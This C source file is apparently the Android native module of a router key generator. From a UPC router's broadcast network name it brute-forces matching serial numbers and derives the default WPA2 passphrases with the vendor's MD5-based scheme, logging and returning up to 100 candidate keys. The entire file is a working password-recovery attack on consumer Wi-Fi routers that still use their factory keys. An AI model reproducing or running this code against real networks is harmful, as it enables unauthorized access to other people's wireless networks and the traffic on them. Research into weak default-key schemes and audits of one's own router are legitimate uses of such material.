#include <android/log.h>
#include <ctype.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "upc_keys_wrapper.h"
#include "upc_keys.h"
#include "md5.h"

#define MAX_PASS_CN 100
#define PASS_LEN 9

// Logging
#define LOG_TAG "upc_keys"
#define DPRINTF(...)  __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG,__VA_ARGS__)
#define IPRINTF(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define EPRINTF(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)

JNIEXPORT jobjectArray JNICALL Java_org_exobel_routerkeygen_algorithms_UpcKeygen_upcNative
        (JNIEnv * env, jobject obj, jbyteArray ess)
{
  jobjectArray ret;

  // Get stopRequested - cancellation flag.
  jclass cls = (*env)->GetObjectClass(env, obj);
  jfieldID fid_s = (*env)->GetFieldID(env, cls, "stopRequested", "Z");
  if (fid_s == NULL) {
    return NULL; /* exception already thrown */
  }
  unsigned char stop = (*env)->GetBooleanField(env, obj, fid_s);

  // ESSID reading from parameter.
  jbyte *e_native = (*env)->GetByteArrayElements(env, ess, 0);
  char * e_ssid = (char*) e_native;

  // Definitions.
  MD5_CTX ctx;
  uint8_t message_digest[20];
  uint32_t buf[4], target;
  char serial[64];
  char pass[9], tmpstr[17];
  uint8_t h1[16], h2[16];
  uint32_t hv[4], w1, w2, i, cnt=0;
  char pass_database[MAX_PASS_CN][PASS_LEN];

  target = strtoul(e_ssid + 3, NULL, 0);
  IPRINTF("Computing UPC keys for essid [%s], target %lu", e_ssid, (unsigned long)target);
  unsigned long stop_ctr = 0;

  // Compute - from upc_keys.c
  for (buf[0] = 0; buf[0] <= MAX0; buf[0]++) {
    for (buf[1] = 0; buf[1] <= MAX1; buf[1]++) {
      for (buf[2] = 0; buf[2] <= MAX2; buf[2]++) {
        for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
          // Check cancellation signal.
          stop_ctr += 1;
          if (stop_ctr > 5000){
            stop_ctr = 0;
            stop = (*env)->GetBooleanField(env, obj, fid_s);
            if (stop) {
              break;
            }
          }

          if (upc_generate_ssid(buf, MAGIC_24GHZ) != target && upc_generate_ssid(buf, MAGIC_5GHZ) != target) {
            continue;
          }

          cnt++;
          sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);

          MD5_Init(&ctx);
          MD5_Update(&ctx, serial, strlen(serial));
          MD5_Final(h1, &ctx);

          for (i = 0; i < 4; i++) {
            hv[i] = *(uint16_t * )(h1 + i * 2);
          }

          w1 = mangle(hv);

          for (i = 0; i < 4; i++) {
            hv[i] = *(uint16_t * )(h1 + 8 + i * 2);
          }

          w2 = mangle(hv);

          sprintf(tmpstr, "%08X%08X", w1, w2);

          MD5_Init(&ctx);
          MD5_Update(&ctx, tmpstr, strlen(tmpstr));
          MD5_Final(h2, &ctx);

          hash2pass(h2, pass);
          IPRINTF("  -> #%02d WPA2 phrase for '%s' = '%s'", cnt, serial, pass);

          if (cnt < MAX_PASS_CN) {
            memcpy(pass_database[cnt - 1], pass, PASS_LEN);
          } else {
            break;
          }
        }
      }
    }
  }

  // Construct array of computed strings.
  ret = (jobjectArray) (*env)->NewObjectArray(env, cnt, (*env)->FindClass(env, "java/lang/String"), 0);
  for(i=0; i<cnt; i++) {
    (*env)->SetObjectArrayElement(env, ret, i, (*env)->NewStringUTF(env, pass_database[i]));
  }

  (*env)->ReleaseByteArrayElements(env, ess, e_native, 0);
  return ret;
}

